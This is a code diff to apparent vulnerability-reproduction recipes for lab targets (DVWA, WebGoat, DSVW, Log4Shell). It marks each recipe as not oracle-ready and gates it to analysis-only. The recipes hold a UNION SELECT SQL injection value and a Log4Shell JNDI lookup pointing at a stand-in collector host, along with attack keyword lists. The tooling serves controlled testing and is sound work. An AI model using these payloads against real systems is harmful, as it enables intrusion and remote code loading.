@@ -62,6 +62,10 @@ function isDvwaConfig(config: unknown): config is DvwaConfig {
 function dvwaCommandInjectionRecipe(config: DvwaConfig): ReproductionRecipe {
   return {
     id: "dvwa-command-injection",
+    // Not ready: the gap above (JSON body vs form-encoded, session-gated page) means this oracle
+    // would misjudge the target. authorizeReproductionTarget refuses a not-ready recipe as
+    // NO_APPROVED_ORACLE, so a run here is provably ANALYSIS_ONLY until the gap is closed.
+    oracleReady: false,
     title: "OS command injection in the DVWA command-execution page",
     keywords: ["command injection", "os command injection", "rce", "exec", config.commandInjectionPath],
     // No HTTP endpoint seeds a canary into DVWA, so the fixture only confirms the page answers.
@@ -121,6 +125,8 @@ function canaryInWebGoatOutput(body: string, canary: string): boolean {
 function webGoatSqlInjectionRecipe(config: WebGoatConfig): ReproductionRecipe {
   return {
     id: "webgoat-sqli-lesson",
+    // Not ready: same JSON-vs-form and login gap as DVWA. Gated to NO_APPROVED_ORACLE.
+    oracleReady: false,
     title: "UNION SQL injection in the WebGoat SqlInjection lesson",
     keywords: ["sql injection", "sqli", "union select", "webgoat", config.sqlInjectionPath],
     fixture: { request: { method: "GET", path: config.sqlInjectionPath } },
@@ -167,6 +173,9 @@ function dsvwSqlInjectionRecipe(config: DsvwConfig): ReproductionRecipe {
   const injection = `2 UNION SELECT '${CANARY_PLACEHOLDER}'`;
   return {
     id: "dsvw-sqli",
+    // Not ready: the canary sits in a GET path the orchestrator never substitutes, so the oracle
+    // could never match today. Gated to NO_APPROVED_ORACLE.
+    oracleReady: false,
     title: "UNION SQL injection in the DSVW user lookup",
     keywords: ["sql injection", "sqli", "union select", "dsvw", `${config.sqlInjectionPath}?id=`],
     fixture: { request: { method: "GET", path: config.sqlInjectionPath } },
@@ -211,6 +220,9 @@ function log4ShellRecipe(config: Log4ShellConfig): ReproductionRecipe {
   const jndiValue = `\${jndi:ldap://bountydesk-collector.invalid/${CANARY_PLACEHOLDER}}`;
   return {
     id: "log4shell-jndi",
+    // Not ready: the real proof is an out-of-band JNDI callback the in-band oracle cannot see.
+    // Gated to NO_APPROVED_ORACLE so the in-band proxy can never be mistaken for a verdict.
+    oracleReady: false,
     title: "Log4Shell JNDI injection via a logged request header",
     keywords: ["log4shell", "jndi", "cve-2021-44228", "log4j", "rce"],
     fixture: { request: { method: "GET", path: config.injectionPath } },
